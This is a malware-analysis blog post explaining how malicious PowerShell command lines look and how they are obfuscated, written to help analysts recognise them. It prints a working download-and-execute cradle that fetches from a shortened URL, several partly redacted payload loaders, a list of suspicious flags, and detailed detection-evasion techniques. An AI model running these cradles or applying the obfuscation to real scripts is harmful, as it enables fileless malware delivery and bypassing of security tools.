<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Powershell: Understanding the complexity behind it" /><meta name="author" content="fareedfauzi" /><meta property="og:locale" content="en_US" /><meta name="description" content="Understanding Powershell in malware analysis" /><meta property="og:description" content="Understanding Powershell in malware analysis" /><link rel="canonical" href="https://fareedfauzi.github.io/posts/Understanding-Powershell/" /><meta property="og:url" content="https://fareedfauzi.github.io/posts/Understanding-Powershell/" /><meta property="og:site_name" content="~/FareedFauzi" /><meta property="og:image" content="https://fareedfauzi.github.io/" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-11T08:06:00+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://fareedfauzi.github.io/" /><meta property="twitter:title" content="Powershell: Understanding the complexity behind it" /><meta name="twitter:site" content="@0xfareed" /><meta name="twitter:creator" content="@fareedfauzi" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Understanding Powershell in malware analysis","@type":"BlogPosting","url":"https://fareedfauzi.github.io/posts/Understanding-Powershell/","headline":"Powershell: Understanding the complexity behind it","dateModified":"2020-05-11T08:06:00+08:00","datePublished":"2020-05-11T08:06:00+08:00","image":"https://fareedfauzi.github.io/","mainEntityOfPage":{"@type":"WebPage","@id":"https://fareedfauzi.github.io/posts/Understanding-Powershell/"},"author":{"@type":"Person","name":"fareedfauzi"},"@context":"https://schema.org"}</script><title>Powershell: Understanding the complexity behind it | ~/FareedFauzi</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/img/Profile/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">~/FareedFauzi</a></div><div class="site-subtitle font-italic">Just another cyber-security blog discussing about malware analysis, malware research and reverse engineering</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/fareedfauzi" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xfareed" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fareedradzi','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Powershell: Understanding the complexity behind it</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Powershell: Understanding the complexity behind it</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, May 11, 2020, 8:06 AM +0800" > May 11, 2020 <i class="unloaded">2020-05-11T08:06:00+08:00</i> </span> by <span class="author"> fareedfauzi </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 20, 2021, 1:15 PM +0800" > Sep 20 <i class="unloaded">2021-09-20T13:15:29+08:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="" class="post-preview-img"><p>PowerShell attacks are currently the popular weapon of alternative for several of those attacks as a result of it provides variety of techniques for bypassing existing security. Not least of all, the flexibility to run directly in memory and remotely download payloads gave a lot of benefits to attacker.</p><p>Let’s learn a little bit about Powershell malicious command line.</p><h1 id="download">Download</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')
</pre></table></code></div></div><p>Powershell command that are use to download “something” can be consider as a high potentially of a malicious attack. The command above indicate that the command is run to download strings (payload) at URL <code class="language-plaintext highlighter-rouge">https://tinyurl.com/y5nupk4e</code>. A goodware will never do such a thing to download their file using powershell command.</p><h1 id="lower-and-upper-case-letters">Lower and upper case letters</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Powershell -ExecUTIONPoLICy BypASs -wiNDoWSTYLe hidDeN(NEW-objecT.SYstEM.NET.wEbCLIeNt).DOWnLoADFiLE(&lt;removed&gt;);
</pre></table></code></div></div><p>This pattern of powershell is using alternating lower and upper case letters to execute their command. It’s a high potentially of a malicious command when it come with this pattern.</p><h1 id="using-short-flags">Using short flags</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Powershell -nop -w hidden -e &lt;encoded text&gt;
Powershell -nop -w hidden -e &lt;ps1 file&gt;
</pre></table></code></div></div><p>Sometimes, this pattern of command uses by goodwares to does their job backgroundly. If the command included a long encoded text, I can 100% sure that those command is a malicious. Legit software will never use encoded text to execute it’s job.</p><p>For <code class="language-plaintext highlighter-rouge">.ps1</code> part, recognizing the location of the ps1 file and its name can help us to determine it’s a malicious or not. If you can get the hash of the <code class="language-plaintext highlighter-rouge">.ps1</code>, drop it into Google/Virustotal/Sandbox to futher investigation.</p><p>Short flags reference:</p><div class="table-wrapper"><table><thead><tr><th>Parameters<th>short parameters<tbody><tr><td>-Command<td>-c<tr><td>-EncodedArguments<td>-ea, -encodeda<tr><td>-EncodedCommand<td>-e, -ec, -enc<tr><td>-ExecutionPolicy<td>-ex, -ep<tr><td>-File<td>-f<tr><td>-Help<td>-h,-? or /h,/?<tr><td>-InputFormat<td>-i, -if<tr><td>-NoExit<td>-noe<tr><td>-NoLogo<td>-nol<tr><td>-NoProfile<td>-nop<tr><td>-NonInteractive<td>-noni<tr><td>-OutputFormat<td>-o, -of<tr><td>-Sta<td>-s<tr><td>-WindowStyle<td>-w</table></div><p>For more information about parameters, refer this <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1">Microsoft docs</a>.</p><p>Also this picture explained it all:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959319-ce445c68-aa03-4ada-ab84-777cbacb1430.png" alt="2020-08-03-14-03-40" /></p><h1 id="using-encoded-commands">Using encoded commands</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Powershell -EncodedCommand SQBmACgAJABQAFMAVgB
Powershell -e SQBmACgAJABQAFMAVgB
Powershell -enc SQBmACgAJABQAFMAVgB
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">-encodedcommand</code> is long version of <code class="language-plaintext highlighter-rouge">-e</code> parameter. They both does a same job where is the function of this parameter is to execute encoded command.</p><h1 id="invoke-expression">Invoke expression</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Powershell -Invoke-Expression (("New-Object Net.WebClient")).(’Downloadfile.ps1’)
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Invoke-Expression</code> or <code class="language-plaintext highlighter-rouge">IEX</code> cmdlet evaluates or runs a specified string as a command. So, anything after Invoke-Expression will be assume as command execution.</p><h1 id="using-char-instead-of-a-character">Using ”[char]” instead of a character</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Powershell ... $cs = [char]71; $fn = $env:temp+$cs; ...
</pre></table></code></div></div><p>Malware often usen “[char]” to replace with character to evade or bypass AV. Also this type of command pattern often used to slow malware analyst’s investigation progress.</p><h1 id="reading-data-in-base-64">Reading data in base 64</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IEX $s=New-Object IO.MemoryStream([Convert]::FromBase64String(’&lt;removed&gt;’));
</pre></table></code></div></div><p>Base64 encoding often used in malware payload.</p><h1 id="using-utf8-encoding">Using UTF8 encoding</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;removed&gt;’));
</pre></table></code></div></div><h1 id="using-a-random-name-for-a-variable-in-every-run">Using a random name for a variable in every run</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell iex $env:vruuyg
</pre></table></code></div></div><p>Example of usage: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959329-048ad6aa-de9a-4fae-86cf-10a0b29069ad.png" alt="2020-08-03-14-11-32" /></p><p>If we look into properties’s envinronment, we can see that the variable <code class="language-plaintext highlighter-rouge">pajsj</code> has value of the command execution.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959335-f95886bf-4db5-496d-8007-d0ef8e26d520.png" alt="2020-08-03-14-12-38" /></p><h1 id="and-many-more">and many more…</h1><p>We need to consider these command-line arguments, such as:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>ExecutionPolicy Bypass, 
-Exec Bypass, 
-ep bypass, 
-EncodedCommand, 
-enc
-NonInteractive, 
-NonI, 
-NoLogo, 
-NoProfile, 
-NoP, 
-WindowStyle Hidden, 
-w Hidden
</pre></table></code></div></div><p>Example of powershell obfuscation:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959346-2b6357d5-48d5-43f7-82c7-ba1487e5e453.png" alt="2020-08-03-13-52-18" /></p><p>3 layer obfuscation:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959356-dbf43662-3f97-4024-bf59-f15d0acb414a.png" alt="2020-08-03-13-53-26" /></p><p>A code snapshot of macro malware that uses “^” for command shell obfuscation</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959370-ba894e7b-cf0b-49c8-9317-d9f36199b64e.png" alt="2020-08-03-13-55-57" /></p><p>Another complex obfuscation in malware wild.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/133959382-1c444469-5fee-4c07-9b88-829bfa938b14.png" alt="2020-08-03-14-14-31" /></p><p>and many more.</p><h1 id="short-note-on-obfuscation">Short note on obfuscation</h1><ul><li>The URL is just a string, so can be concatenated and written in other ways such as <code class="language-plaintext highlighter-rouge">“h” + “ttp”</code>. Additional string obfuscation techniques are covered below.<li><code class="language-plaintext highlighter-rouge">System</code> is optional in PowerShell type names, so <code class="language-plaintext highlighter-rouge">System.Net.WebClient</code> can be written as <code class="language-plaintext highlighter-rouge">Net.WebClient</code><li>PowerShell can use either single or double quotes in strings. Whitespace can be added almost anywhere, so <code class="language-plaintext highlighter-rouge">DownloadString(‘</code> could just as easily be written as <code class="language-plaintext highlighter-rouge">DownloadString( “</code><li>The WebClient class offers many methods to download content in addition to <code class="language-plaintext highlighter-rouge">DownloadString</code>, such as <code class="language-plaintext highlighter-rouge">DownloadFile</code>, <code class="language-plaintext highlighter-rouge">DownloadData</code>, and <code class="language-plaintext highlighter-rouge">OpenReadAsync</code><li>Method names such as <code class="language-plaintext highlighter-rouge">DownloadString</code> can be included in quotes and have escape characters included to create a syntax like<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> System.Net.WebClient).”`D`o`wn`l`oa`d`Str`in`g” 
</pre></table></code></div></div></ul><p>Because it can be treated as a string, string-based obfuscation techniques such as concatenation and reordering can also be used on the method name.</p><ul><li>Similar to method names, the <code class="language-plaintext highlighter-rouge">Net.WebClient</code> argument to <code class="language-plaintext highlighter-rouge">New-Object</code> can be obfuscated with escape characters, string-based obfuscation techniques, and concatenation across multiple variables. That can produce a result like:<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$var1="`N`et."; 
$var2="`W`eb`C`l`ient"; 
(New-Object $var1$var2) 
</pre></table></code></div></div><li>PowerShell command names often have aliases. For example, <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> can also be referred to as <code class="language-plaintext highlighter-rouge">iex</code>.<li>Even when commands do not have aliases, the <code class="language-plaintext highlighter-rouge">Get-Command</code> command lets a script author query the PowerShell command list and invoke the result. This query can include wildcards, so invoking <code class="language-plaintext highlighter-rouge">New-Object</code> can look like this: <code class="language-plaintext highlighter-rouge">&amp; (Get-Command *w-O*)</code>. The invocation (<code class="language-plaintext highlighter-rouge">&amp;</code>) operator in this example has an alternative, which is the dot (<code class="language-plaintext highlighter-rouge">.</code>) operator. The <code class="language-plaintext highlighter-rouge">Get-Command</code> cmdlet has an alias and can be dynamically invoked similarly, so is not safe to key on.<li>In addition to <code class="language-plaintext highlighter-rouge">Get-Command</code> as a mechanism to query command names, PowerShell offers several API-style methods to query command names – such as <code class="language-plaintext highlighter-rouge">$executionContext.InvokeCommand.GetCommand()</code>.<li>The invocation (&amp; and .) operators support string arguments. These can be easily obscured using obfuscation techniques such as string concatenation and string reordering.<li>Detection of <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> suffers from the same challenges of command obfuscation that <code class="language-plaintext highlighter-rouge">New-Object</code> and <code class="language-plaintext highlighter-rouge">Get-Command</code> suffer from. It is also popular in non-malicious contexts, making false positives based on this indicator a significant challenge.<li><code class="language-plaintext highlighter-rouge">Invoke-Expression</code> is not the only cmdlet or technique that can be used to invoke dynamicallygenerated code. Other alternatives are <code class="language-plaintext highlighter-rouge">Invoke-Command</code>, Script Block invocation (such as <code class="language-plaintext highlighter-rouge">&amp; [Scriptblock]::Create("Write-Host Script Block Conversion")</code> ), and dynamic script invocation APIs such as <code class="language-plaintext highlighter-rouge">$ExecutionContext.InvokeCommand.InvokeScript("Write-Host EXPRESSION")</code>.</ul><h1 id="string-obfuscation">String obfuscation</h1><p>Anything that allows a string as an argument can be obfuscated using string obfuscation techniques.</p><ul><li>String concatenation is a common way to break up identifiable strings. If a signature is written for the term, <code class="language-plaintext highlighter-rouge">“http”</code>, it can also be written as <code class="language-plaintext highlighter-rouge">“h” + “ttp”</code>. The most common form of concatenation is the <code class="language-plaintext highlighter-rouge">‘+’</code> operator, but PowerShell’s <code class="language-plaintext highlighter-rouge">–join</code> operator can also be used. In addition to PowerShell techniques, the <code class="language-plaintext highlighter-rouge">String.Join()</code> and <code class="language-plaintext highlighter-rouge">String.Concat()</code> methods from .NET can accomplish the same goals.<li>PowerShell’s <code class="language-plaintext highlighter-rouge">–f</code> string formatting operator, based on the C# <code class="language-plaintext highlighter-rouge">String.Format</code> method, can create strings at runtime. The format operator uses format tokens like <code class="language-plaintext highlighter-rouge">{0}</code> and <code class="language-plaintext highlighter-rouge">{1}</code> to identify the order of replacement strings, so obfuscating the invocation of <code class="language-plaintext highlighter-rouge">New-Object</code> might look like this with format operator obfuscation applied: <code class="language-plaintext highlighter-rouge">&amp; ("{1}{0}{2}" -f 'wOb','Ne','ject')</code>.<li>Strings can be reversed through several mechanisms, such as PowerShell’s array slicing operator <code class="language-plaintext highlighter-rouge">(-join "detacsufbO"[9..0])</code>, Array.Reverse (<code class="language-plaintext highlighter-rouge">$a = [char[]]"detacsufbO"; [Array]::Reverse($a); -join $a</code>), reverse regular expression matching (<code class="language-plaintext highlighter-rouge">-join [RegEx]::Matches("detacsufbO",'.','RightToLeft')</code>), and others.<li>Strings can be split by an arbitrary delimiter, and then rejoined: <code class="language-plaintext highlighter-rouge">-join ("Obf~~usc~~ated" -split "~~")</code><li>Through the <code class="language-plaintext highlighter-rouge">–replace</code> operator or the <code class="language-plaintext highlighter-rouge">String.Replace()</code> method, strings can be replaced either to remove delimiters, or change the meaning of a string: <code class="language-plaintext highlighter-rouge">"System.SafeClass" -replace "Safe","Unsafe"</code></ul><p>ref:</p><ol><li>https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf<li>Research Paper “Detecting Malicious PowerShell Commands using Deep Neural Networks” by Danny Hendler, Shay Kels and Amir Rubin.<li>https://www.trendmicro.com/vinfo/pl/security/news/security-technology/security-101-the-rise-of-fileless-threats-that-abuse-powershell<li>https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/note/'>Note</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/powershell/" class="post-tag no-text-decoration" >Powershell</a> <a href="/tags/fileless/" class="post-tag no-text-decoration" >Fileless</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Powershell: Understanding the complexity behind it - ~/FareedFauzi&url=https://fareedfauzi.github.io/posts/Understanding-Powershell/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Powershell: Understanding the complexity behind it - ~/FareedFauzi&u=https://fareedfauzi.github.io/posts/Understanding-Powershell/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Powershell: Understanding the complexity behind it - ~/FareedFauzi&url=https://fareedfauzi.github.io/posts/Understanding-Powershell/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Malware-dev-analysis/">Malware 101: Develop and Analyze our own malware</a><li><a href="/posts/Understanding-Powershell/">Powershell: Understanding the complexity behind it</a><li><a href="/posts/Deobfuscate-Powershell/">Powershell script: An easy way to deobfuscate it!</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/fileless/">Fileless</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/malicious-document/">Malicious Document</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/malware-development/">Malware Development</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Deobfuscate-Powershell/"><div class="card-body"> <span class="timeago small" > Feb 6 <i class="unloaded">2021-02-06T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Powershell script: An easy way to deobfuscate it!</h3><div class="text-muted small"><p> I came across a fileless malware called Lemon-Duck crypto miner during our (my officemate and I) investigation on suspicious communication in our client network. This malware completely leveraging ...</p></div></div></a></div><div class="card"> <a href="/posts/Maldoc-Cheatsheet/"><div class="card-body"> <span class="timeago small" > Jan 6 <i class="unloaded">2021-01-06T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malicious Document: Cheatsheet and Note</h3><div class="text-muted small"><p> RTF RTF often comes with exploits targetting Microsoft Word vulnerabilities. Always look for embedded objects and anomalous content in the RTF. Be prepared to locate, extract and analyze shellcod...</p></div></div></a></div><div class="card"> <a href="/posts/Malware-dev-analysis/"><div class="card-body"> <span class="timeago small" > Sep 20 <i class="unloaded">2021-09-20T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malware 101: Develop and Analyze our own malware</h3><div class="text-muted small"><p> In this post, we’ll learn together how to write a basic malware program that does a reverse shell connection (using shellcode) and analyze our own compiled malware. We’ll play around with C code us...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn 